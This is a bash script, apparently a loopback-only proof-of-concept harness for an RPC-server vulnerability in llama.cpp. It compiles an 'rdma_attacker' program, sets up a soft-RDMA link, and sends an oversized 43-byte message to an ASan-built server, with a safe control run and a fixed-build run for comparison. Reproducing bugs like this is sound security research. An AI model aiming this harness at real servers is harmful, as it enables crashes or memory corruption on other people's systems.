#!/usr/bin/env bash
# Loopback-only live-server experiment for CVE-2026-118375.
#   bash wire/run.sh attack     # 43-byte SEND into the 1-byte RPC command
#   bash wire/run.sh safe       # 1-byte SEND, control
#   bash wire/run.sh fixed      # same 43 bytes against the upstream fixed build
#   SERVER_BIN=... bash wire/run.sh attack   # override server binary
set -uo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
WIRE="$ROOT/wire"
SERVER="${SERVER_BIN:-$ROOT/src/llama.cpp-pin/build-asan/bin/ggml-rpc-server}"
EVID="$WIRE/evidence"
MODE="${1:-attack}"
LEN=43
PORT=53052
CREATED=0
SRV=0

case "$MODE" in
    attack) LEN=43; PORT=53052 ;;
    safe)   LEN=1;  PORT=53053 ;;
    fixed)  LEN=43; PORT=53054 ;;
    *) echo "usage: $0 attack|safe|fixed" >&2; exit 2 ;;
esac

mkdir -p "$EVID"
if [ ! -x "$SERVER" ]; then
    echo "server binary missing: $SERVER" >&2
    exit 2
fi

g++ -std=c++17 -O0 -g "$WIRE/rdma_attacker.cpp" -libverbs -o "$WIRE/rdma_attacker" || exit 2

cleanup() {
    if [ "$SRV" -ne 0 ]; then
        kill "$SRV" 2>/dev/null || true
        wait "$SRV" 2>/dev/null || true
    fi
    if [ "$CREATED" -eq 1 ]; then
        sudo -n rdma link del rxe0 2>/dev/null || true
    fi
}
trap cleanup EXIT

if ! sudo -n rdma link show 2>/dev/null | grep -q 'rxe0'; then
    sudo -n modprobe rdma_rxe || exit 2
    sudo -n rdma link add rxe0 type rxe netdev lo || exit 2
    CREATED=1
fi
sudo -n rdma link show 2>/dev/null | grep -A2 rxe0 || true

: > "$EVID/server-$MODE.log"
echo "=== server: $SERVER -H 127.0.0.1 -p $PORT, payload $LEN bytes ===" > "$EVID/client-$MODE.log"
ASAN_OPTIONS=detect_leaks=0:abort_on_error=0:print_stacktrace=1 \
    "$SERVER" -H 127.0.0.1 -p "$PORT" > "$EVID/server-$MODE.log" 2>&1 &
SRV=$!
for _ in $(seq 1 100); do
    grep -q 'Starting RPC server' "$EVID/server-$MODE.log" && break
    sleep 0.1
done
grep -q 'Starting RPC server' "$EVID/server-$MODE.log" || {
    echo "server did not start" >&2
    cat "$EVID/server-$MODE.log" >&2
    exit 3
}

"$WIRE/rdma_attacker" 127.0.0.1 "$PORT" "$LEN" >> "$EVID/client-$MODE.log" 2>&1
CLIENT_RC=$?
sleep 1
kill "$SRV" 2>/dev/null || true
wait "$SRV" 2>/dev/null || true
SRV=0

echo "client_rc=$CLIENT_RC payload_len=$LEN port=$PORT"
echo "--- client ---"
cat "$EVID/client-$MODE.log"
echo "--- server (first 80 lines) ---"
sed -n '1,80p' "$EVID/server-$MODE.log"
